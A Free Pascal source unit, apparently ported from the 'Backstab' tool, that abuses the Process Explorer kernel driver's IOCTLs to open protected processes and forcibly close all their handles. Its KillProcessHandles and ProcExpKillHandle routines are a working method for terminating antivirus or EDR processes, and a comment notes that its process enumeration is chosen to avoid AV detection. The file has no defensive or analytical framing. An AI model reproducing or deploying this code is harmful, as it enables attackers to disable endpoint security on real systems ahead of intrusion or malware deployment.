unit procexp_utils;

{$mode delphi}

interface

uses
  windows,Classes, SysUtils,ntdll in '..\handles-fpc\ntdll.pas';

const
  IOCTL_CLOSE_HANDLE =2201288708;
 IOCTL_OPEN_PROTECTED_PROCESS_HANDLE =2201288764;
 IOCTL_GET_HANDLE_NAME =2201288776;
 IOCTL_GET_HANDLE_TYPE =2201288780;

 type PROCEXP_DATA_EXCHANGE=record
	 ulPID:ULONGLONG;
	 lpObjectAddress:PVOID;
	 ulSize:ULONGLONG;
	 ulHandle:ULONGLONG;
end;

   //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/process.htm

     type _SYSTEM_PROCESSES = record // Information Class 5
         NextEntryDelta: ULONG;
         ThreadCount: ULONG;
         Reserved1: array [0..5] of ULONG;

         {
         Reserved1:  nativeint; //LARGE_INTEGER;
         Reserved2:  ULONG;
         Reserved3:  ULONG;
         reserved4:  ULONGLONG;
         }

         CreateTime: nativeint; //LARGE_INTEGER;
         UserTime: nativeint; //LARGE_INTEGER;
         KernelTime: nativeint; //LARGE_INTEGER;
         ProcessName: UNICODE_STRING;
         BasePriority: nativeint; //long //KPRIORITY;
         ProcessId: ULONG;
         InheritedFromProcessId: ULONG;
         HandleCount: ULONG;
         SessionId: ULONG;
         Reservedx: ULONG;
         //VmCounters: VM_COUNTERS;
         //IoCounters: IO_COUNTERS;  // Windows 2000 only
         //Threads: array [0..0] of _SYSTEM_THREADS;
       end;
       SYSTEM_PROCESSES = _SYSTEM_PROCESSES;
       PSYSTEM_PROCESSES = ^SYSTEM_PROCESSES;
       TSystemProcesses = SYSTEM_PROCESSES;
       PSystemProcesses = PSYSTEM_PROCESSES;

function ProcExpOpenProtectedProcess( ulPID:ULONGLONG) :thandle;
function ProcExpKillHandle( dwPID:DWORD;  usHandle:ULONGLONG) :boolean;

procedure KillProcessHandles(hProcess:thandle);

function _EnumProc2(search:string=''):dword;

var
 hProcExpDevice:thandle=thandle(-1);



implementation

{
function QueryFullProcessImageNameA(
   hProcess:HANDLE;
    dwFlags:DWORD;
    lpExeName:LPSTR;
    lpdwSize:PDWORD):bool; stdcall; external 'kernel32.dll';
}
//

procedure log(msg:string;debug:byte=1);
begin
      writeln(msg);
end;

//uses NtQuerySystemInformation which does not need to openprocess with PROCESS_QUERY_INFORMATION or PROCESS_VM_READ
//therefore, less likely to be blocked by AV's
function _EnumProc2(search:string=''):dword;
var
 i,rl,cp : dword;
 pinfo : PSystemProcesses;
 buf : Pointer;
 dim: dword;
 username,domain,tmp:string;
 //t:_SYSTEM_THREADS ;
 //
 //processes:array of process;
 //
 NtQuerySystemInformation:function (SystemInformationClass: SYSTEM_INFORMATION_CLASS;
                                        SystemInformation: PVOID;
                                        SystemInformationLength: ULONG;
                                        ReturnLength: PULONG
                                        ): NTSTATUS; stdcall;
begin
   {$ifdef CPU32}result:=_enumproc(search);exit;{$endif cpu32}
   //
   NtQuerySystemInformation:=getProcAddress(loadlibrary('ntdll.dll'),'NtQuerySystemInformation');
   //
   result:=0;
   //log('**** _EnumProc2 ****');
  dim := 256*1024;
  GetMem(buf, dim);
  rl := 0;
  //messageboxa(0,'test1','',0);
  i := NtQuerySystemInformation(SystemProcessesAndThreadsInformation, buf, dim, @rl);
  while (i = $C0000004) do
    begin
      dim := dim + (256*1024);
      FreeMem(buf);
      GetMem(buf, dim);
      i := NtQuerySystemInformation(SystemProcessesAndThreadsInformation, buf, dim, @rl);
    end;
  if i = 0 then
    begin
      cp := 0;

      repeat
        pinfo := PSystemProcesses(Pointer(nativeuint(buf) + cp));
        if pinfo=nil then break;
        cp := cp + pinfo.NextEntryDelta;
        //setlength(processes,length(processes)+1);
        with pinfo^ do
          begin
          if search='' then
          begin
          //log(WideCharToString(ProcessName.Buffer)+#9+tmp,1 );
          log(inttostr(ProcessId)+ #9+WideCharToString(ProcessName.Buffer)+#9+tmp,1 );
          end; //if search='' then
          if search<>'' then
          if lowercase(search)=lowercase(strpas(ProcessName.Buffer) ) then
             begin
             result:=ProcessId;
             break;
             end; //if lowercase...

          end; //with
      until (pinfo.NextEntryDelta = 0);
    end;
 FreeMem(buf);
end;

function GetHandleInformationTable:PSYSTEM_HANDLE_INFORMATION;
var
 handleinfosize:ulong;
 handleinfo:psystem_handle_information;
 status:ntstatus;
begin
   handleinfosize:=DefaulBUFFERSIZE;
      handleinfo:=virtualalloc(nil,size_t(handleinfosize),mem_commit,page_execute_readwrite);

      status:=ntquerysysteminformation(systemhandleinformation,handleinfo,handleinfosize,nil);
      while status=STATUS_INFO_LENGTH_MISMATCH do
      begin
        handleinfosize*=2;
        if handleinfo<>nil then virtualfree(handleinfo,0{size_t(handleinfosize)},mem_release);
        setlasterror(0);
        handleinfo:=virtualalloc(nil,size_t(handleinfosize),mem_commit,page_execute_readwrite);
        status:=ntquerysysteminformation(systemhandleinformation,handleinfo,handleinfosize,nil);
      end;

      result:= handleinfo;
end;



procedure KillProcessHandles(hProcess:thandle);
var
  	 dwPID:DWORD;
	 ulReturnLenght:ULONG = 0;
         i:ULONG;
         handleTableInformation:PSYSTEM_HANDLE_INFORMATION;
         handleInfo:SYSTEM_HANDLE;
         dwProcStatus:DWORD;
begin

	dwPID := GetProcessId(hProcess);
	ulReturnLenght := 0;

	//allocating memory for the SYSTEM_HANDLE_INFORMATION structure in the heap

	handleTableInformation := GetHandleInformationTable();

	for i := 0 to handleTableInformation^.uCount  -1 do
	begin
		handleInfo := handleTableInformation^.Handles[i];

		if (handleInfo.uIdProcess = dwPID) then //meaning that the handle is within our process of interest
		begin
			//* Check if the process is already killed every 15 closed handles (otherwise we'll keep trying to close handles that are already closed) */
			if (i mod 15 = 0) then
			begin
				dwProcStatus := 0;
				GetExitCodeProcess(hProcess, dwProcStatus);
				if (dwProcStatus <> STILL_ACTIVE) then break;
			end;
			ProcExpKillHandle(dwPID, handleInfo.Handle);
		end;
	end;
        virtualfree(handleTableInformation,0,mem_release);
end;


function GetObjectAddressFromHandle(dwPID:DWORD; usTargetHandle:USHORT):pvoid;
var
      	//ulReturnLenght:ULONG = 0;
	handleTableInformation:PSYSTEM_HANDLE_INFORMATION;
        i:ULONG;
        handleInfo:SYSTEM_HANDLE;
begin
        result:=nil;
	handleTableInformation := GetHandleInformationTable();

	for i := 0 to  handleTableInformation^.uCount -1 do
        begin
		handleInfo := handleTableInformation^.Handles[i];

		if (handleInfo.uIdProcess  = dwPID) then //meaning that the handle is within our process of interest
		begin
			if (handleInfo.Handle = usTargetHandle) then
                        begin
                          result:= handleInfo.pObject ;
                          break;
                        end;
                end;
	end;

        virtualfree(handleTableInformation,0,mem_release);
end;

//**************************************************************



function ProcExpOpenProtectedProcess( ulPID:ULONGLONG) :thandle;
var
hProtectedProcess :HANDLE= thandle(-1);
 dwBytesReturned :DWORD= 0;
 ret:boolean = FALSE;
begin




	ret := DeviceIoControl(hProcExpDevice, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, @ulPID, sizeof(ulPID),
		@hProtectedProcess,
		sizeof(HANDLE),
		@dwBytesReturned,
		nil);


	if (dwBytesReturned = 0) or (ret=false) then
	begin
		writeln('ProcExpOpenProtectedProcess.DeviceIoControl: '+inttostr(GetLastError()));
		result:=thandle(-1);
	end;

	result:= hProtectedProcess;
end;

function ProcExpKillHandle( dwPID:DWORD;  usHandle:ULONGLONG) :boolean;
var
	 lpObjectAddressToClose :PVOID= nil;
	 ctrl :PROCEXP_DATA_EXCHANGE; //= { 0 };
	 bRet :BOOL= FALSE;
begin

	//* find the object address */
	lpObjectAddressToClose := GetObjectAddressFromHandle(dwPID, ushort(usHandle));
        if lpObjectAddressToClose=nil then exit;


	//* populate the data structure */
	ctrl.ulPID := dwPID;
	ctrl.ulSize := 0;
	ctrl.ulHandle := usHandle;
	ctrl.lpObjectAddress := lpObjectAddressToClose;

	//* send the kill command */
        write('.');
	bRet := DeviceIoControl(hProcExpDevice, IOCTL_CLOSE_HANDLE, @ctrl, sizeof(PROCEXP_DATA_EXCHANGE), nil,
		0,
		nil,
		nil);

	if bret=false
		then writeln('ProcExpKillHandle.DeviceIoControl');

	result:= TRUE;
end;


end.

